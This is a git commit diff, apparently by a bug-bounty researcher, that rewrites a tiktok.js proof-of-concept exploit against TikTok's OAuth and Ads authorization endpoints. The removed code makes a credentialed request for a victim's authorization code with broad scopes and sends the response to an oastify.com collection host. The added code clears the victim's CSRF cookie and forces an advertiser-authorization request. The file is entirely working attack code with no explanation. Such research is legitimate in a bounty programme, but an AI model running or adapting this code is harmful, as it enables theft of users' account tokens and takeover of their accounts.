9d3cc89f0d7b698564d008faae11499eb6392b7f
mrhavit <mrhavit@wearehackerone.com>
2025-01-13 22:44:25 +0200

    a

--- tiktok.js
+++ tiktok.js
@@ -1,10 +1,1 @@
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('POST', 'https://www.tiktok.com/passport/open/web/auth/v2/?client_key=aw8cb3204x0a1g88&scope=user.info.basic%2Cuser.info.username%2Cvideo.list.private_ads.no_watermark%2Cuser.info.showcase%2Cuser.account.configure%2Ccomment.list.manage%2Cuser.setting.update%2Cuser.info.stats%2Cvideo.list.manage%2Cuser.account.type%2Cbiz.account.info%2Ccomment.list%2Clive.list%2Cuser.info.phone%2Cbiz.account.phone%2Cbizpartner.item.info%2Cbiz.account.email%2Cuser.setting.list%2Cmessage.list.admin%2Cuser.info.profile%2Cuser.info.email%2Cvideo.list.no_watermark%2Cbizpartner.user.info&aid=1459&state=cGxhdGZvcm09dGlrdG9rJmxvZ2luX2FjdGlvbj1yZWRpcmVjdCZmcm9tX3BhZ2U9bG9naW4md2luU2VhcmNoPXsicmVkaXJlY3QiOiJodHRwcyUzQSUyRiUyRmFkcy50aWt0b2suY29tJTJGaTE4biUyRmhvbWUlM0ZsYW5nJTNEZW4ifSZjc3JmdG9rZW49NGViNDE5OTAxNmYxMmNmNTQ4ZDI4OWQ4MTYwYzRjY2IwN2NlOTMwMiZyZWRpcmVjdF91cmk9aHR0cHMlM0ElMkYlMkZhZHMudGlrdG9rLmNvbSUyRmkxOG4lMkZsb2dpbg..&redirect_uri=https%3A%2F%2Fads.tiktok.com%2Fi18n%2Flogin&source=web&response_type=code');
-req.setRequestHeader('Content-Type', 'application/json');
-req.withCredentials = true;
-req.send('{}');
-
-function reqListener() {
-    location='https://tyvfl9tx87rern0ad7gjh20ev51wpvdk.oastify.com/log?key='+this.responseText; 
-};
+document.cookie='csrftoken=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/';fetch('https://ads.tiktok.com/marketing_api/api/advertiser/authorize/?msToken=&X-Bogus=&_signature=',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({scope:[10000,1,2,4,6,7,8,3,9,15000000,12000000,5,16000000],redirect:true,state:'your_custom_params',timezone_name:'Asia/Jerusalem',browser_language:'en-US',cookie_enabled:true,screen_width:1920,screen_height:992,browser_platform:'MacIntel',browser_name:'Mozilla',browser_version:'5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',initial_timestamp:'1736797890974',client_id:'7456641880151818257',user_type:1,redirect_uri:'https://example.com/'})}).then(response=>response.text()).then(alert).catch(console.error);
